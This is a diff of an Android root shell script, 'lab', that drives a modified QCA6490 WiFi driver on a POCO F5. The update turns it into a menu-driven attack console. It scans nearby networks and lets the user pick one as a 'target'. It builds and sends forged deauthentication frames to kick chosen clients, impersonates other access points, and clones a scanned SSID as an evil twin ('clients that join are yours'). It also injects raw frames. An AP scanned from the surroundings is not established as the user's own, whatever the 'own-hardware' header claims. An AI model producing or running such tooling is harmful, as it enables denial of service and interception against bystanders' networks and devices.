@@ -1,14 +1,40 @@
 #!/system/bin/sh
-# lab - QCA6490 WiFi research command center
-# POCO F5 / marble, kernel 5.10.258-Bouquet-v4.9 (v16+ feature set)
-# Run as root:  su -c "/data/local/tmp/lab <command> [args]"
-# Own-hardware research only. Every gate is default-off for a reason.
+# ============================================================
+#  lab - QCA6490 WiFi research command center (interactive)
+#  POCO F5 / marble - kernel 5.10.258-Bouquet-v4.9 (v16+)
+#  Run as root:   su -c "/data/local/tmp/lab"          (menus)
+#                 su -c "/data/local/tmp/lab <cmd> .." (direct)
+#  Own-hardware research only. Gates are default-off on purpose.
+# ============================================================
 
 P=/data/local/tmp
 Q=/sys/module/qca6490/parameters
+SCANF="$P/.lab_scan"
+PICKF="$P/.lab_pick"
 
-hr() { echo "------------------------------------------------------------"; }
+# ---------- output helpers ----------
+if [ -t 1 ]; then
+    R=$'\033[31m'; G=$'\033[32m'; Y=$'\033[33m'; C=$'\033[36m'
+    B=$'\033[1m';  N=$'\033[0m'
+else
+    R=""; G=""; Y=""; C=""; B=""; N=""
+fi
 
+banner() {
+    echo "${C}${B}"
+    echo "  +--------------------------------------------+"
+    echo "  |   lab  -  QCA6490 research command center  |"
+    echo "  +--------------------------------------------+${N}"
+}
+
+hdr()  { echo; echo "${C}${B}== $* ==${N}"; }
+say()  { echo "  $*"; }
+ok()   { echo "  ${G}+ $*${N}"; }
+warn() { echo "  ${Y}! $*${N}"; }
+err()  { echo "  ${R}x $*${N}"; }
+ask()  { printf "  ${B}? %s${N}" "$1"; }
+
+# ---------- state helpers ----------
 gate_on()  { printf Y > "$Q/$1" 2>/dev/null; }
 gate_off() { printf N > "$Q/$1" 2>/dev/null; }
 
@@ -23,89 +49,114 @@ gates_all_off() {
     echo 0 > "$Q/monitor_mgmt_tx_chanfreq" 2>/dev/null
 }
 
-flat() { echo "$1" | tr -d ':'; }
+flat()     { echo "$1" | tr -d ':'; }
+cur_freq() { cmd wifi status 2>/dev/null | grep -o "Frequency: [0-9]*MHz" | head -1 | tr -dc 0-9; }
+cur_bssid(){ cmd wifi status 2>/dev/null | grep -o "BSSID: [0-9a-fA-F:]*" | head -1 | cut -d' ' -f2; }
 
-cur_freq() {
-    cmd wifi status 2>/dev/null | grep -o "Frequency: [0-9]*MHz" | head -1 | tr -dc 0-9
-}
-
-cur_bssid() {
-    cmd wifi status 2>/dev/null | grep -o "BSSID: [0-9a-fA-F:]*" | head -1 | cut -d' ' -f2
-}
-
+# send_frame <freq> <hex>  -> writes the direct trigger
 send_frame() {
     printf '%s:%s' "$1" "$2" > "$Q/monitor_spoof_tx"
-    return $?
+}
+
+# build_deauth <da-flat> <sa-flat> <bssid-flat>  -> sets DEAUTH_HEX
+build_deauth() {
+    DEAUTH_HEX="c0000000${1}${2}${3}00000700"
 }
 
 show_counters() {
-    echo "telemetry:"
-    cat "$Q/monitor_probe_tx_status" 2>/dev/null | sed 's/^/  /'
-    cat "$Q/monitor_spoof_tx" 2>/dev/null | sed 's/^/  /'
+    say "firmware/trigger telemetry:"
+    cat "$Q/monitor_probe_tx_status" 2>/dev/null | sed 's/^/      /'
+    cat "$Q/monitor_spoof_tx" 2>/dev/null | sed 's/^/      /'
 }
 
-cmd_status() {
-    echo "kernel      : $(uname -r)"
-    echo "con_mode    : $(cat /sys/module/qca6490/parameters/con_mode 2>/dev/null)"
-    echo "gates:"
-    for g in monitor_probe_tx monitor_probe_tx_sta_vdev \
-             monitor_mgmt_tx_unrestricted monitor_mgmt_tx_spoof_sa \
-             monitor_spoof_tx_sap monitor_spoof_tx_data monitor_data_tx; do
-        printf '  %-34s %s\n' "$g" "$(cat "$Q/$g" 2>/dev/null)"
-    done
-    echo "chanfreq    : $(cat "$Q/monitor_mgmt_tx_chanfreq" 2>/dev/null)"
-    echo "sap_force   : $(cat "$Q/monitor_sap_force_channel" 2>/dev/null)"
-    show_counters
-    echo "wifi        : $(cmd wifi status 2>/dev/null | head -3 | tr '\n' ' ' | cut -c1-110)"
-    ip -br link 2>/dev/null | grep wlan
-    echo "tools:"
-    for t in nl80211_probe nl80211_mgmt_tx nl80211_probe_tx mon_inject_raw \
-             mon_capture hapd_ctrl qca_sap_acs; do
-        if [ -x "$P/$t" ]; then echo "  $t ok"; else echo "  $t MISSING"; fi
-    done
-}
-
-cmd_scan() {
-    cmd wifi start-scan 2>/dev/null
-    sleep 6
-    cmd wifi list-scan-results 2>/dev/null | head -50
-}
-
-cmd_sta_deauth() {
-    victim=$(flat "${1:?usage: lab sta-deauth <victim-mac> [count] [interval-sec]}")
-    count=${2:-1}
-    interval=${3:-0.2}
-    freq=$(cur_freq)
-    bssid=$(flat "$(cur_bssid)")
-    if [ -z "$freq" ] || [ -z "$bssid" ]; then
-        echo "error: phone not connected to an AP (need in-band home channel)"
-        return 1
-    fi
-    gate_on monitor_probe_tx
-    gate_on monitor_mgmt_tx_unrestricted
-    gate_on monitor_mgmt_tx_spoof_sa
+# mgmt gates for the STA route
+gates_sta_mgmt() {
+    gate_on  monitor_probe_tx
+    gate_on  monitor_mgmt_tx_unrestricted
+    gate_on  monitor_mgmt_tx_spoof_sa
     gate_off monitor_probe_tx_sta_vdev
     gate_off monitor_spoof_tx_sap
     gate_off monitor_spoof_tx_data
     gate_off monitor_data_tx
-    hex="c0000000${victim}${bssid}${bssid}00000700"
-    echo "freq=$freq bssid=$bssid victim=$victim count=$count"
+}
+
+# ============================================================
+#  scan + pick
+# ============================================================
+do_scan() {
+    hdr "scanning"
+    cmd wifi start-scan >/dev/null 2>&1
+    sleep 6
+    cmd wifi list-scan-results 2>/dev/null > "$SCANF"
+    awk 'NF > 4 && $1 ~ /^[0-9a-fA-F][0-9a-fA-F]:/ {
+        bssid=$1; freq=$2; rssi=$3;
+        sub(/\(.*/, "", rssi);
+        ssid="";
+        for (i=5; i<=NF; i++) ssid = ssid (i>5 ? " " : "") $i;
+        i = index(ssid, " [");
+        if (i > 0) ssid = substr(ssid, 1, i - 1);
+        if (ssid ~ /^\[/) ssid = "";
+        n++;
+        printf "%d|%s|%s|%s|%s\n", n, bssid, freq, rssi, (ssid==""?"(hidden)":ssid)
+    }' "$SCANF" > "$PICKF"
+    say "found $(wc -l < "$PICKF" 2>/dev/null) networks"
+}
+
+pick_ap() {
+    do_scan
+    if [ ! -s "$PICKF" ]; then
+        err "scan returned nothing"
+        return 1
+    fi
+    echo
+    awk -F'|' '{ printf "  %2d) %-17s  %5s MHz  %5s dBm   %s\n", $1, $2, $3, $4, $5 }' "$PICKF"
+    echo
+    ask "pick a target [1-n], 0=back: "
+    read sel || sel=0
+    case "$sel" in
+        ''|0) return 1 ;;
+    esac
+    line=$(awk -F'|' -v n="$sel" '$1==n' "$PICKF")
+    if [ -z "$line" ]; then
+        err "no such entry"
+        return 1
+    fi
+    T_BSSID=$(echo "$line" | awk -F'|' '{print $2}')
+    T_FREQ=$(echo "$line"  | awk -F'|' '{print $3}')
+    T_RSSI=$(echo "$line"  | awk -F'|' '{print $4}')
+    T_SSID=$(echo "$line"  | awk -F'|' '{print $5}')
+    ok "target: ${T_SSID}  ${T_BSSID}  ${T_FREQ} MHz  ${T_RSSI} dBm"
+    return 0
+}
+
+# ============================================================
+#  direct actions (also used by the menus)
+# ============================================================
+act_sta_deauth() {                       # $1 victim, $2 count, $3 interval
+    freq=$(cur_freq); bssid=$(flat "$(cur_bssid)")
+    victim=$(flat "$1"); count=${2:-1}; interval=${3:-0.2}
+    if [ -z "$freq" ] || [ -z "$bssid" ] || [ -z "$victim" ]; then
+        err "need: connection + victim mac"; return 1
+    fi
+    gates_sta_mgmt
+    build_deauth "$victim" "$bssid" "$bssid"
+    say "in-band deauth: freq=$freq bssid=$bssid victim=$victim x$count"
     i=0
     while [ "$i" -lt "$count" ]; do
-        send_frame "$freq" "$hex"
+        send_frame "$freq" "$DEAUTH_HEX"
         i=$((i + 1))
         [ "$i" -lt "$count" ] && sleep "$interval"
     done
     sleep 2
     show_counters
-    echo "note: STA path is in-band - the victim must share this channel"
+    warn "in-band only: the victim must share this channel"
 }
 
-cmd_ap_up() {
-    freq=${1:?usage: lab ap-up <freq> [ssid] [passphrase]}
-    ssid=${2:-LabAP}
-    pass=${3:-labpass123}
-    if [ "$freq" -ge 4000 ] 2>/dev/null; then band=5; else band=2; fi
+act_ap_up() {                            # $1 freq, $2 ssid, $3 pass
+    freq=$1; ssid=${2:-LabAP}; pass=${3:-labpass123}
+    if [ -z "$freq" ]; then err "need a frequency"; return 1; fi
+    band=2; [ "$freq" -ge 4000 ] 2>/dev/null && band=5
+    hdr "AP role: $ssid on $freq MHz (band $band)"
     cmd wifi stop-softap >/dev/null 2>&1
     svc wifi disable
     sleep 1
@@ -114,47 +165,44 @@ cmd_ap_up() {
     echo "$freq" > "$Q/monitor_sap_force_channel"
     sleep 6
     got=$(cmd wifi status 2>/dev/null | grep -o "frequency= *[0-9]*" | head -1 | tr -dc 0-9)
-    echo "requested freq : $freq"
-    echo "SAP reports    : $got"
-    [ "$got" != "$freq" ] && echo "WARNING: CSA may still be settling - check with: lab status"
-    gate_on monitor_probe_tx
-    gate_on monitor_mgmt_tx_unrestricted
-    gate_on monitor_mgmt_tx_spoof_sa
-    gate_on monitor_spoof_tx_sap
-    gate_off monitor_probe_tx_sta_vdev
-    gate_off monitor_spoof_tx_data
-    gate_off monitor_data_tx
-    echo "AP up (STA off). deauth: lab ap-deauth <victim-mac> <victim-ap-bssid> [count] [interval]"
-}
-
-cmd_ap_down() {
-    cmd wifi stop-softap >/dev/null 2>&1
-    gates_all_off
-    echo "AP down, gates off"
-}
-
-cmd_ap_deauth() {
-    victim=$(flat "${1:?usage: lab ap-deauth <victim-mac> <victim-ap-bssid> [count] [interval-sec]}")
-    vapid=$(flat "${2:?usage: lab ap-deauth <victim-mac> <victim-ap-bssid> [count] [interval-sec]}")
-    count=${3:-1}
-    interval=${4:-0.2}
-    freq=$(cat "$Q/monitor_sap_force_channel" 2>/dev/null)
-    if [ -z "$freq" ] || [ "$freq" = "0" ]; then
-        echo "error: run 'lab ap-up <freq>' first"
-        return 1
+    say "requested: $freq MHz   SAP reports: $got MHz"
+    if [ "$got" != "$freq" ]; then
+        warn "CSA may still be settling - recheck with: lab status"
+    else
+        ok "SAP on channel"
     fi
-    gate_on monitor_probe_tx
-    gate_on monitor_mgmt_tx_unrestricted
-    gate_on monitor_mgmt_tx_spoof_sa
-    gate_on monitor_spoof_tx_sap
+    gate_on  monitor_probe_tx
+    gate_on  monitor_mgmt_tx_unrestricted
+    gate_on  monitor_mgmt_tx_spoof_sa
+    gate_on  monitor_spoof_tx_sap
     gate_off monitor_probe_tx_sta_vdev
     gate_off monitor_spoof_tx_data
     gate_off monitor_data_tx
-    hex="c0000000${victim}${vapid}${vapid}00000700"
-    echo "freq=$freq victim=$victim impersonating=$vapid count=$count"
+    ok "AP-role gates on - phone is unassociated (STA off)"
+}
+
+act_ap_deauth() {                        # $1 victim, $2 ap-bssid, $3 count, $4 interval
+    victim=$(flat "$1"); vapid=$(flat "$2")
+    count=${3:-1}; interval=${4:-0.2}
+    freq=$(cat "$Q/monitor_sap_force_channel" 2>/dev/null)
+    if [ -z "$victim" ] || [ -z "$vapid" ]; then
+        err "need victim mac + victim AP bssid"; return 1
+    fi
+    if [ -z "$freq" ] || [ "$freq" = "0" ]; then
+        err "SAP not up - run ap-up / impersonate first"; return 1
+    fi
+    gate_on  monitor_probe_tx
+    gate_on  monitor_mgmt_tx_unrestricted
+    gate_on  monitor_mgmt_tx_spoof_sa
+    gate_on  monitor_spoof_tx_sap
+    gate_off monitor_probe_tx_sta_vdev
+    gate_off monitor_spoof_tx_data
+    gate_off monitor_data_tx
+    build_deauth "$victim" "$vapid" "$vapid"
+    say "forged deauth: freq=$freq victim=$victim as=$vapid x$count"
     i=0
     while [ "$i" -lt "$count" ]; do
-        send_frame "$freq" "$hex"
+        send_frame "$freq" "$DEAUTH_HEX"
         i=$((i + 1))
         [ "$i" -lt "$count" ] && sleep "$interval"
     done
@@ -162,39 +210,30 @@ cmd_ap_deauth() {
     show_counters
 }
 
-cmd_mgmt() {
-    freq=${1:?usage: lab mgmt <freq> <hex-frame>}
-    hex=${2:?usage: lab mgmt <freq> <hex-frame>}
-    gate_on monitor_probe_tx
-    gate_on monitor_mgmt_tx_unrestricted
-    gate_on monitor_mgmt_tx_spoof_sa
+act_data() {                             # $1 freq, $2 hex
+    gate_on  monitor_probe_tx
+    gate_on  monitor_mgmt_tx_unrestricted
+    gate_on  monitor_data_tx
+    gate_on  monitor_spoof_tx_data
     gate_off monitor_probe_tx_sta_vdev
-    gate_off monitor_spoof_tx_data
-    gate_off monitor_data_tx
-    send_frame "$freq" "$hex"
+    gate_off monitor_spoof_tx_sap
+    gate_off monitor_mgmt_tx_spoof_sa
+    send_frame "$1" "$2"
+    sleep 2
+    say "trigger: $(cat "$Q/monitor_spoof_tx" 2>/dev/null)"
+    dmesg 2>/dev/null | grep mon_data_tx | tail -3
+}
+
+act_mgmt() {                             # $1 freq, $2 hex
+    gates_sta_mgmt
+    send_frame "$1" "$2"
     sleep 2
     show_counters
 }
 
-cmd_data() {
-    freq=${1:?usage: lab data <freq> <hex-802.11-data-frame>  (needs connected STA)}
-    hex=${2:?usage: lab data <freq> <hex-802.11-data-frame>}
-    gate_on monitor_probe_tx
-    gate_on monitor_mgmt_tx_unrestricted
-    gate_on monitor_data_tx
-    gate_on monitor_spoof_tx_data
-    gate_off monitor_probe_tx_sta_vdev
-    gate_off monitor_spoof_tx_sap
-    gate_off monitor_mgmt_tx_spoof_sa
-    send_frame "$freq" "$hex"
-    sleep 2
-    echo "trigger: $(cat "$Q/monitor_spoof_tx" 2>/dev/null)"
-    dmesg 2>/dev/null | grep mon_data_tx | tail -3
-}
-
-cmd_monitor() {
-    freq=${1:-2412}
-    secs=${2:-20}
+act_monitor() {                          # $1 freq, $2 seconds
+    freq=${1:-2412}; secs=${2:-20}
+    hdr "true monitor conparam: $freq MHz for ${secs}s"
     cmd wifi stop-softap >/dev/null 2>&1
     svc wifi disable
     sleep 1
@@ -204,62 +243,173 @@ cmd_monitor() {
     sleep 6
     ip link set wlan0 up 2>/dev/null
     printf '%s 0\n' "$freq" > /sys/class/net/wlan0/monitor_mode_channel 2>/dev/null
-    if [ "$(cat "$Q/mon_chan_set_stage" 2>/dev/null)" != "20" ]; then
-        echo "channel set stage: $(cat "$Q/mon_chan_set_stage" 2>/dev/null) (20 = ok)"
-    fi
-    echo "capturing $secs s on $freq ..."
+    stage=$(cat "$Q/mon_chan_set_stage" 2>/dev/null)
+    [ "$stage" = "20" ] && ok "channel set (stage 20)" || warn "channel stage=$stage (20 = ok)"
+    say "capturing ${secs}s ..."
     "$P/mon_capture" wlan0 "$secs" 2>/dev/null || "$P/mon_capture" mon0 "$secs"
-    echo "done. restore with: lab wifi-restore"
+    say "restore with: lab wifi-restore"
 }
 
-cmd_wifi_restore() {
+cmd_status() {
+    hdr "status"
+    say "kernel    : $(uname -r)"
+    say "con_mode  : $(cat /sys/module/qca6490/parameters/con_mode 2>/dev/null)"
+    say "gates:"
+    for g in monitor_probe_tx monitor_probe_tx_sta_vdev \
+             monitor_mgmt_tx_unrestricted monitor_mgmt_tx_spoof_sa \
+             monitor_spoof_tx_sap monitor_spoof_tx_data monitor_data_tx; do
+        printf '      %-34s %s\n' "$g" "$(cat "$Q/$g" 2>/dev/null)"
+    done
+    say "chanfreq  : $(cat "$Q/monitor_mgmt_tx_chanfreq" 2>/dev/null)"
+    say "sap_force : $(cat "$Q/monitor_sap_force_channel" 2>/dev/null)"
+    show_counters
+    say "wifi      : $(cmd wifi status 2>/dev/null | head -3 | tr '\n' ' ' | cut -c1-100)"
+    ip -br link 2>/dev/null | grep wlan | sed 's/^/      /'
+    say "tools:"
+    for t in nl80211_probe nl80211_mgmt_tx nl80211_probe_tx mon_inject_raw \
+             mon_capture hapd_ctrl qca_sap_acs; do
+        if [ -x "$P/$t" ]; then say "  $t ok"; else err "  $t MISSING"; fi
+    done
+}
+
+# ============================================================
+#  guided flows
+# ============================================================
+flow_attack_menu() {
+    while :; do
+        hdr "target: ${T_SSID}  (${T_BSSID} @ ${T_FREQ} MHz, ${T_RSSI} dBm)"
+        echo "   1) deauth a client of this AP"
+        echo "   2) impersonate this AP (channel-force + forged frames)"
+        echo "   3) evil twin - clone this SSID on this channel"
+        echo "   4) monitor - capture on this channel"
+        echo "   5) raw data frame (needs connected STA)"
+        echo "   0) back"
+        ask "action: "
+        read act || act=0
+        case "$act" in
+        1)
+            ask "victim mac (e.g. aa:bb:cc:dd:ee:ff): "
+            read vm || vm=""
+            [ -z "$vm" ] && { err "need a victim"; continue; }
+            mybssid=$(flat "$(cur_bssid)")
+            if [ "$mybssid" = "$(flat "$T_BSSID")" ]; then
+                ok "phone is on this AP - in-band STA route"
+                ask "count [1]: "; read c; ask "interval sec [0.2]: "; read iv
+                act_sta_deauth "$vm" "${c:-1}" "${iv:-0.2}"
+            else
+                warn "phone is not on this AP - using AP-role escape"
+                act_ap_up "$T_FREQ"
+                ask "count [1]: "; read c; ask "interval sec [0.2]: "; read iv
+                act_ap_deauth "$vm" "$T_BSSID" "${c:-1}" "${iv:-0.2}"
+            fi
+            ;;
+        2)
+            act_ap_up "$T_FREQ"
+            while :; do
+                ask "victim mac (0=back): "
+                read vm || vm=0
+                [ "$vm" = "0" ] && break
+                [ -z "$vm" ] && continue
+                ask "count [1]: "; read c; ask "interval sec [0.2]: "; read iv
+                act_ap_deauth "$vm" "$T_BSSID" "${c:-1}" "${iv:-0.2}"
+            done
+            ;;
+        3)
+            [ "$T_SSID" = "(hidden)" ] && { err "cannot clone a hidden SSID"; continue; }
+            ask "passphrase for the twin [labpass123]: "
+            read pw || pw=""
+            act_ap_up "$T_FREQ" "$T_SSID" "${pw:-labpass123}"
+            warn "twin is up - no internet behind it; clients that join are yours"
+            ;;
+        4)
+            ask "seconds [20]: "
+            read s || s=""
+            act_monitor "$T_FREQ" "${s:-20}"
+            ;;
+        5)
+            ask "hex data frame (fc 0x8800 + da + sa + bssid + seq + qos): "
+            read hx || hx=""
+            [ -z "$hx" ] && continue
+            act_data "$T_FREQ" "$hx"
+            ;;
+        0|q) break ;;
+        esac
+    done
+}
+
+flow_main_menu() {
+    while :; do
+        hdr "main menu"
+        echo "   1) scan + pick a target (guided)"
+        echo "   2) status"
+        echo "   3) monitor capture (any channel)"
+        echo "   4) raw mgmt frame (direct)"
+        echo "   5) raw data frame (direct)"
+        echo "   6) restore normal wifi (gates off)"
+        echo "   q) quit"
+        ask "choose: "
+        read m || m=q
+        case "$m" in
+        1) if pick_ap; then flow_attack_menu; fi ;;
+        2) cmd_status ;;
+        3) ask "freq [2412]: "; read f; ask "seconds [20]: "; read s
+           act_monitor "${f:-2412}" "${s:-20}" ;;
+        4) ask "freq: "; read f; ask "hex frame: "; read hx
+           [ -n "$f" ] && [ -n "$hx" ] && act_mgmt "$f" "$hx" ;;
+        5) ask "freq: "; read f; ask "hex data frame: "; read hx
+           [ -n "$f" ] && [ -n "$hx" ] && act_data "$f" "$hx" ;;
+        6) gates_all_off; cmd wifi stop-softap >/dev/null 2>&1
+           echo 0 > /sys/module/qca6490/parameters/con_mode
+           svc wifi enable; sleep 4
+           ok "restored (reboot if wifi did not come back)" ;;
+        q|Q|"") break ;;
+        esac
+    done
     gates_all_off
-    cmd wifi stop-softap >/dev/null 2>&1
-    echo 0 > /sys/module/qca6490/parameters/con_mode
-    svc wifi enable
-    sleep 6
-    cmd wifi status | head -3
-    echo "if wifi did not come back: reboot (con_mode resets on boot)"
+    ok "gates off - bye"
 }
 
+# ============================================================
+#  direct (scriptable) commands
+# ============================================================
 cmd_help() {
-    hr
-    echo "lab - QCA6490 WiFi research command center (own hardware only)"
-    hr
-    echo "  status                         gates, counters, state, tools"
-    echo "  scan                           normal wifi scan + results"
-    echo "  sta-deauth <victim> [n] [sec]  in-band deauth via connected STA"
-    echo "  ap-up <freq> [ssid] [pass]     unassociated AP on chosen channel"
-    echo "  eviltwin <ssid> <pass> <freq>  same as ap-up (target's name)"
-    echo "  ap-deauth <victim> <apbssid>   deauth via SAP (needs ap-up)"
-    echo "              [n] [sec]"
-    echo "  ap-down                        stop AP, gates off"
-    echo "  mgmt <freq> <hex>              raw management frame (STA route)"
-    echo "  data <freq> <hex>              raw DATA frame (v20 DP path, STA)"
-    echo "  monitor <freq> [seconds]       true monitor conparam + capture"
-    echo "  wifi-restore                   gates off, back to normal wifi"
-    echo "  gates-off                      all gates to N"
-    hr
-    echo "frames are hex; deauth builder is built in (reason 7)"
-    echo "data frames: fc 0x8800 e.g. 88000000<da><sa><bssid>0000<qos>"
-    echo "example kick:  lab sta-deauth aa:bb:cc:dd:ee:ff 3 0.2"
-    echo "example escape: lab ap-up 5745 && lab ap-deauth aa:bb:cc:dd:ee:ff 78:3e:a1:d4:fa:3d 5 0.2"
-    hr
+    banner
+    echo
+    echo "  interactive:  su -c /data/local/tmp/lab"
+    echo
+    echo "  direct commands:"
+    echo "    status                          gates, counters, state"
+    echo "    scan                            list networks"
+    echo "    sta-deauth <victim> [n] [sec]   in-band deauth (connected STA)"
+    echo "    ap-up <freq> [ssid] [pass]      unassociated AP + channel force"
+    echo "    ap-deauth <victim> <apbssid>    forged deauth via SAP"
+    echo "                 [n] [sec]"
+    echo "    ap-down                         stop AP + gates off"
+    echo "    eviltwin <ssid> <pass> <freq>   clone an SSID on a channel"
+    echo "    mgmt <freq> <hex>               raw management frame"
+    echo "    data <freq> <hex>               raw data frame (v20 DP path)"
+    echo "    monitor <freq> [seconds]        true monitor + capture"
+    echo "    wifi-restore                    gates off, normal wifi"
+    echo "    gates-off                       all gates N"
 }
 
-case "${1:-help}" in
+case "${1:-menu}" in
+    menu)         banner; flow_main_menu ;;
     status)       cmd_status ;;
-    scan)         cmd_scan ;;
-    sta-deauth)   shift; cmd_sta_deauth "$@" ;;
-    ap-up)        shift; cmd_ap_up "$@" ;;
-    ap-down)      cmd_ap_down ;;
-    eviltwin)     freq=$4; ssid=$2; pass=$3; shift 4; cmd_ap_up "$freq" "$ssid" "$pass" ;;
-    ap-deauth)    shift; cmd_ap_deauth "$@" ;;
-    mgmt)         shift; cmd_mgmt "$@" ;;
-    data)         shift; cmd_data "$@" ;;
-    monitor)      shift; cmd_monitor "$@" ;;
-    wifi-restore) cmd_wifi_restore ;;
-    gates-off)    gates_all_off; echo "all gates N" ;;
+    scan)         do_scan; awk -F'|' '{ printf "  %2d) %-17s  %5s MHz  %5s dBm   %s\n", $1, $2, $3, $4, $5 }' "$PICKF" ;;
+    sta-deauth)   shift; act_sta_deauth "$@" ;;
+    ap-up)        shift; act_ap_up "$@" ;;
+    ap-down)      cmd wifi stop-softap >/dev/null 2>&1; gates_all_off; ok "AP down, gates off" ;;
+    ap-deauth)    shift; act_ap_deauth "$@" ;;
+    eviltwin)     freq=$4; ssid=$2; pass=$3; [ -z "$freq" ] && { err "usage: lab eviltwin <ssid> <pass> <freq>"; exit 1; }; act_ap_up "$freq" "$ssid" "$pass" ;;
+    mgmt)         shift; act_mgmt "$@" ;;
+    data)         shift; act_data "$@" ;;
+    monitor)      shift; act_monitor "$@" ;;
+    wifi-restore) gates_all_off; cmd wifi stop-softap >/dev/null 2>&1
+                  echo 0 > /sys/module/qca6490/parameters/con_mode
+                  svc wifi enable; sleep 5; cmd wifi status | head -3
+                  warn "reboot if wifi did not come back" ;;
+    gates-off)    gates_all_off; ok "all gates N" ;;
     help|--help|-h) cmd_help ;;
-    *) echo "unknown command: $1 (try 'lab help')"; exit 1 ;;
+    *)            err "unknown: $1"; cmd_help; exit 1 ;;
 esac
